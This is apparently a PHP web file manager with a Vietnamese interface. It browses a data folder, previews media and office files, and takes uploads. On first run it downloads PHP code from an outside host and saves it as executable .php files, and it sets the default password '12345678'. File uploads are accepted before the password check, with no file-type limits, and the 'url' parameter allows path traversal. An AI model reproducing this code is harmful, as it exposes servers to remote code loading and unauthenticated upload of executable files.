<?php
session_start();
if(isset($_GET['url'])){
    $urlget=$_GET['url'];
}else
    $urlget='';

$root=$_SERVER['DOCUMENT_ROOT'];

if(!file_exists("xulyfile.php")){
    $myfile = fopen("xulyfile.php", "w");
    $txt = file_get_contents("https://luutru.pmviet.vn/images/xulyfile.xml");
    fwrite($myfile, $txt);
    fclose($myfile);
}
if(!file_exists("img.php")){
    $myfile = fopen("img.php", "w");
    $txt = file_get_contents("https://luutru.pmviet.vn/images/img.xml");
    fwrite($myfile, $txt);
    fclose($myfile);
}
if(!file_exists("setting.txt")){
    $myfile = fopen("setting.txt", "w");
    $txt = "12345678";
    fwrite($myfile, $txt);
    fclose($myfile);
}

$http='https://';
$urlweb=$http.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'';
$urlget=str_replace('//', "/", $urlget);
$thumucdata="/data";
$urlgetok=dirname(__FILE__)."$thumucdata$urlget";
date_default_timezone_set("Asia/Ho_Chi_Minh");
$urlht= $http.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$rootfile="$root$thumucdata$urlget";
$File_arr=read_dir($urlgetok,'both',true);
$rootfile=str_replace('///', "/", $rootfile);
$rootfile=str_replace('//', "/", $rootfile);


//check dungluong
function checkdl($dungluong){
	if($dungluong>=0){
		if($dungluong<1024*8){
			$dungluong=$dungluong."b";
		}elseif($dungluong<1024*1024){
			$dungluong=round(($dungluong/(1024)), 2);
			$dungluong=$dungluong."Kb";
		}elseif($dungluong<1024*1024*1024){
			$dungluong=round(($dungluong/(1024*1024)), 2);
			$dungluong=$dungluong."Mb";
		}elseif($dungluong<1024*1024*1024*1024){
			$dungluong=round(($dungluong/(1024*1024*1024)), 2);
			$dungluong=$dungluong."Gb";
		}else{
		    $dungluong=round(($dungluong/(1024*1024*1024*1024)), 2);
			$dungluong=$dungluong."Tb";
		}
	}
	return $dungluong;
}
?>
<!-- Latest compiled and minified CSS -->
<html lang="vi">
<title>File</title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">
  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js"></script>
  <link rel="stylesheet" href="https://luutru.pmviet.vn/images/js/jquery.fancybox.css" />
  <link rel="stylesheet" href="https://luutru.pmviet.vn/images/js/style.css" />
  <script src="https://luutru.pmviet.vn/images/js/jquery.fancybox.js"></script>
<script>
function save() {
    var form_data = new FormData();
	form_data.append("formdoc",$('#formdoc').val());
	form_data.append("linkfile",$('#linkfile').val());
	$.ajax({
		url: 'xulyfile.php', // point to server-side PHP script 
		dataType: 'text', // what to expect back from the PHP script
		cache: false,
		contentType: false,
		processData: false,
		data: form_data,
		enctype: 'multipart/form-data',
		type: 'post',
		success: function (response) {
		    alert('Lưu thành công');
		}
	});
}
</script>
<?php
function read_dir($dir,$type='both',$extra=false){
    $info=array();
    $dh=opendir($dir);
    $infod=array();$infof=array();
    while ( $name = readdir( $dh )){
        if( $name=="." || $name==".." ) continue;
        if ( is_dir( "$dir/$name" ) && ( $type=='dir' || $type=='both') ){
            if($extra) {
                $tinfo['name']=$name;
                $tinfo['path']=$dir.'/'.$name;
                $tinfo['size']='NA';
                $tinfo['created']=filectime("$dir/$name");
                $tinfo['type']='Folder';
                $infod[]=$tinfo;
            } else $infod[]=$name; }

        if ( is_file( "$dir/$name" ) && ( $type=='file' || $type=='both')  ){
            if($extra) {
                $tinfo['name']=$name;
                $tinfo['path']=$dir.'/'.$name;
                $tinfo['size']=filesize("$dir/$name");
                $tinfo['created']=filectime("$dir/$name");
                $tinfo['type']='File';
                $infof[]=$tinfo;
            } else $infof[]=$name;
        }
    }
 
    $info=array_merge($infod,$infof);
    return $info;
}
?>
<div style="min-height: 768px; margin-top: 20px; width:100%">
<section class="content"><br />
<?php
$linkql = explode('/', $urlget);
$urlql="";

if(file_exists("$urlgetok/setting.txt")){
$array = @file("$urlgetok/setting.txt");
}else{
    if(file_exists("$root/setting.txt")){
        $array = @file("$root/setting.txt");
    }else{
        $array=array();
        $array[0]='';
    }
}
?>
<nav aria-label="breadcrumb" style="position: fixed; background: white; z-index: 10; left: 0px; top: 0px; right: 0px; font-size: 21px; font-weight: bold;">
  <ol class="breadcrumb" style="padding: 10px;">
    <li class="breadcrumb"><a href="<?php echo $urlweb; ?>">Trang chủ</a></li>
    <?php for($i=0;$i<count($linkql);$i++){ $urlql="$urlql/$linkql[$i]"; $urlql=str_replace('//', "/", $urlql); $urlql=str_replace(' ', "%20", $urlql); ?>
    <li class="breadcrumb-item"><a href=<?php echo $urlweb; ?>?url=<?php echo $urlql; ?>><?php echo $linkql[$i]; ?></a></li>
    <?php } ?>
  </ol>
</nav>
<a href="<?php if(($urlget!='')&&($urlget!='/')) echo "$urlht&upload=yes"; else echo "$url/index.php?upload=yes"; ?>"><div style="position: fixed; z-index: 11;  top: 10px; right: 80px; font-size: 21px; font-weight: bold;">Upload</div></a>
<a href="<?php if(($urlget!='')&&($urlget!='/')) echo "$urlht&out=yes"; else echo "$url/index.php?out=yes"; ?>"><div style="position: fixed; z-index: 11;  top: 10px; right: 20px; font-size: 21px; font-weight: bold;">Thoát</div></a>
<div class="row" style="padding: 10px; width:100%">
<?php
    $pass='';
    if(isset($_POST['pass'])){
        $pass=$_SESSION["pass"]=$_POST['pass'];
    }
    if(isset($_SESSION["pass"]))
    $pass=$_SESSION["pass"];
    
    if(isset($_GET['out'])){
        $pass=$_SESSION["pass"]='';
        header("Location: $urlweb/index.php?url=$urlget");
    }
    if (isset($_FILES["file"])){
        $target_dir    = $rootfile;
        $target_file   = $target_dir .'/'.basename($_FILES["file"]["name"]);
        if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)){
          echo "Đã upload thành công.";
            header("Location: $urlweb/index.php?url=$urlget");
        }else echo 'Upload thất bại';
    }
    
    if(($array[0]!='')&&($pass!=$array[0])){
        ?><form action="" method="POST"><div style="padding:20px"> <input type="text" class="form-control" placeholder="Nhập mật khẩu" id="pass" name="pass"> <input type="submit" class="btn btn-primary btn-sm" style="margin: 10px;" value="Đăng nhập"> </div></form><?php
    }elseif(isset($_GET['upload'])){
        ?><form action="" method="POST" enctype="multipart/form-data"><div style="padding:20px"> <input type="file" class="form-control" id="file" name="file"> <input type="submit" class="btn btn-primary btn-sm" style="margin: 10px;" value="Upload"> </div></form><?php
    }else{  
    if(count($File_arr)==0){
        echo '<div style="padding:20px;padding-top:0px"><h5>Thư mục trống</h5></div>';
    }else{
    foreach($File_arr as $row){
    $tenfile=$row['name'];
    if($tenfile!='setting.txt'){
    $duoifile = pathinfo($row['path'], PATHINFO_EXTENSION);
    $dungluong=checkdl($row['size']);
    $urlwebfile=str_replace('index.php', "/", $urlweb);
    
    $urlfile="$urlwebfile$thumucdata$urlget";
    if($row['type']!='File'){
        echo '<div class="col-6 col-sm-4 col-lg-3 col-xl-2 col-xxl-1 posi"><div class="small-box"><a href="'.$urlweb.'?url='.$urlget.'/'.$row['name'].'"><img class="formnd" src="https://luutru.pmviet.vn/images/thumuc.png"> <div class="titlend" >'.$row['name'].'</div></a></div></div>';
    }else{
        if(($duoifile=='mp4')||($duoifile=='ts')||($duoifile=='mkv')||($duoifile=='flv')||($duoifile=='mpg')||($duoifile=='3gp')||($duoifile=='webm')||($duoifile=='pcm')||($duoifile=='aiff')){
            echo '<div class="col-6 col-sm-4 col-lg-3 col-xxl-1 posi"><span class="badge badge-info right">'.$dungluong.'</span><div class="small-box"><a data-fancybox="demo" href="'.$urlfile.'/'.$row['name'].'"><video class="formnd" id="video" src="'.$urlfile.'/'.$row['name'].'#t=15" type="video/mp4"></video></a><div class="titlend"> '.$row['name'].'</div></div></div>';
        }elseif(($duoifile=='jpg')||($duoifile=='png')||($duoifile=='gif')){
            echo '<div class="col-6 col-sm-4 col-lg-3 col-xl-2 col-xxl-1 posi"><span class="badge badge-info right">'.$dungluong.'</span><div class="small-box"><a data-fancybox="demo" data-src="'.$urlfile.'/'.$row['name'].'" data-caption="'.$row['name'].'"><img class="formnd" src="'.$thumucdata.''.$urlget.'/'.$row['name'].'"></a> <div class="titlend">'.$row['name'].'</div></div></div>';
        }elseif($duoifile=='webp'){
            echo '<div class="col-6 col-sm-4 col-lg-3 col-xl-2 col-xxl-1 posi"><span class="badge badge-info right">'.$dungluong.'</span><div class="small-box"><a data-fancybox="demo" data-src="'.$urlfile.'/'.$row['name'].'" data-caption="'.$row['name'].'"><img class="formnd" src="'.$urlwebfile.'/'.$row['name'].'"></a> <div class="titlend">'.$row['name'].'</div></div></div>';
        }elseif(($duoifile=='zip')||($duoifile=='7z')||($duoifile=='bin')||($duoifile=='cab')||($duoifile=='jar')||($duoifile=='css')||($duoifile=='exe')||($duoifile=='html')||($duoifile=='js')||($duoifile=='php')||($duoifile=='rar')||($duoifile=='txt')||($duoifile=='xlsx')||($duoifile=='xls')){
            $duoifile=str_replace("zip", "rar", $duoifile);
            $duoifile=str_replace("7z", "rar", $duoifile);
            $duoifile=str_replace("bin", "rar", $duoifile);
            $duoifile=str_replace("cab", "rar", $duoifile);
            $duoifile=str_replace("jar", "rar", $duoifile);
            if(($duoifile=='xlsx')||($duoifile=='xls'))
            $linkfile="https://view.officeapps.live.com/op/embed.aspx?src=$urlwebfile$thumucdata$urlget/$tenfile";
            else
            $linkfile="$urlwebfile/xulyfile.php?link=$thumucdata$urlget/$tenfile";
            
            echo '<div class="col-6 col-sm-4 col-lg-3 col-xl-2 col-xxl-1 posi"><span class="badge badge-info right">'.$dungluong.'</span><div class="small-box" data-toggle="tooltip" data-html="true" data-bs-placement="bottom" title="'.$tenfile.' '.date('d-m-Y H:i',$row['created']).'"><a data-type="ajax" data-fancybox="demo" data-src="'.$linkfile.'" data-caption="'.$row['name'].'"><img class="formnd" src="https://luutru.pmviet.vn/images/'.$duoifile.'.png"></a> <div class="titlend" > '.$row['name'].'</div></div></div>';
        }else{
            echo '<div class="col-6 col-sm-4 col-lg-3 col-xl-2 col-xxl-1 posi"><span class="badge badge-info right">'.$dungluong.'</span><div class="small-box"><a data-type="iframe" data-fancybox="demo" data-src="'.$urlwebfile.'/xulyfile.php?link='.$thumucdata.''.$urlget.'/'.$row['name'].'" data-caption="'.$row['name'].'"><img class="formnd" src="https://luutru.pmviet.vn/images/file.png"></a> <div class="titlend" > '.$row['name'].'</div></div></div>';
        }
}}}}} ?>
</div>
<script>
$(document).ready(function(){
    $('[data-toggle="tooltip"]').tooltip(); 
});

$('[data-fancybox]').fancybox({
	toolbar  : true,
	smallBtn : true,
	iframe : {
		preload : false
	}
})

function checkWindowSize() {
    var x = document.querySelectorAll(".formnd");
    var i;
    
    var height=document.querySelector('.formnd').offsetWidth;
    for (i = 0; i < x.length; i++) {
      x[i].style.height = height+"px";
      x[i].addEventListener('mouseover', function(){
          this.style.height = height+"px";
      })    
    }
}
checkWindowSize();
window.onresize = checkWindowSize;
</script>
</html>
